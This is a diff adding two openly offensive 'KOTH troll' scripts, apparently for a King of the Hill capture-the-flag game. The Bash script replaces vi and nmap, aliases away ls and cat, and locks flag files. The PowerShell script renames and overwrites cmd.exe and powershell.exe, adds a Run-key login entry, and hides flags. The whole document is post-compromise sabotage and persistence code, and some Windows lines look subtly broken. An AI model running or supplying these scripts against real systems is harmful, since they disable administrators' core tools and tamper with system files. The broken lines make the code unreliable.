@@ -1,0 +1,83 @@
+## Linux Machine
+
+
+#!/bin/bash
+# CyberxploitHausa KOTH Troll Script 😈
+
+echo "[+] Starting CyberxploitHausa troll takeover..."
+
+# 1. Custom Message of the Day
+echo "🔥 CyberxploitHausa owns this machine now! 🔥" > /etc/motd
+
+# 2. Override Shell Prompt
+echo 'export PS1="(🏴 CyberxploitHausa) \u@\h:\w\$ "' >> /etc/bash.bashrc
+
+# 3. Alias common commands
+echo 'alias ls="echo NOPE 😂 - CyberxploitHausa"' >> /etc/bash.bashrc
+echo 'alias cat="echo Meow 🐱 — CyberxploitHausa took your cat."' >> /etc/bash.bashrc
+
+# 4. ASCII Art Banner
+apt install -y figlet > /dev/null 2>&1
+echo 'figlet "CyberxploitHausa Rules!"' >> /etc/bash.bashrc
+
+# 5. Wall message to logged-in users
+wall "👑 CyberxploitHausa is your king now. Kneel. 🪓"
+
+# 6. Fake binary for nmap
+echo -e '#!/bin/bash\necho "CyberxploitHausa owns this now 😎"' > /usr/local/bin/nmap
+chmod +x /usr/local/bin/nmap
+
+# 7. Fake vi to rickroll
+echo -e '#!/bin/bash\necho "🎵 Never gonna give you up..."' > /usr/bin/vi
+chmod +x /usr/bin/vi
+
+# 8. Lock the root flag (readonly)
+chattr +i /root/root.txt 2>/dev/null || echo "[!] Couldn't lock /root/root.txt"
+
+# 9. Signature in flags (if writable)
+echo "🏴 Rooted by CyberxploitHausa" >> /root/root.txt 2>/dev/null
+echo "🏴 Pwned by CyberxploitHausa" >> /home/*/user.txt 2>/dev/null
+
+echo "[+] Troll deployment complete. Sit back and enjoy the chaos 😈"
+
+
+
+## Windows box
+#
+#
+## CyberxploitHausa KOTH Troll Script for Windows 🏴
+
+Write-Host "`n[+] Starting CyberxploitHausa troll on this Windows box...`n" -ForegroundColor Green
+
+# 1. Change wallpaper (to Rick Astley 😏)
+$regPath = "HKCU:\Control Panel\Desktop"
+$url = "https://i.imgur.com/oHg5SJv.jpg"
+$output = "$env:TEMP\rickroll.jpg"
+Invoke-WebRequest -Uri $url -OutFile $output
+Set-ItemProperty -Path $regPath -Name Wallpaper -Value $output
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+# 2. Rename common binaries (like cmd, powershell)
+Rename-Item -Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NewName "pwnshell.exe" -Force -ErrorAction SilentlyContinue
+Rename-Item -Path "C:\Windows\System32\cmd.exe" -NewName "cybercmd.exe" -Force -ErrorAction SilentlyContinue
+
+# 3. Replace cmd.exe and powershell.exe with troll scripts
+Set-Content -Path "C:\Windows\System32\cmd.exe" -Value 'Write-Host "👑 CyberxploitHausa owns cmd now."' -Encoding Ascii
+Set-Content -Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Value 'Write-Host "😈 CyberxploitHausa hijacked PowerShell!"' -Encoding Ascii
+
+# 4. Message box on login
+$Script = 'Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show("👑 CyberxploitHausa has claimed this box! Try again.","KOTH Hijack")'
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CyberxploitHausaMsg" -Value "powershell -Command `$Script"
+
+# 5. Append CyberxploitHausa message to user desktop
+$users = Get-ChildItem C:\Users -Directory | Where-Object { $_.Name -notin @("Public", "Default", "Default User") }
+foreach ($u in $users) {
+    Add-Content "C:\Users\$u\Desktop\README.txt" "🏴 This system has been hijacked by CyberxploitHausa."
+}
+
+# 6. Lock flags (if present)
+attrib +R +S +H C:\Users\*\Desktop\user.txt -ErrorAction SilentlyContinue
+attrib +R +S +H C:\root.txt -ErrorAction SilentlyContinue
+
+Write-Host "`n[+] CyberxploitHausa troll script complete. Long live the KOTH King! 🏴" -ForegroundColor Cyan
+
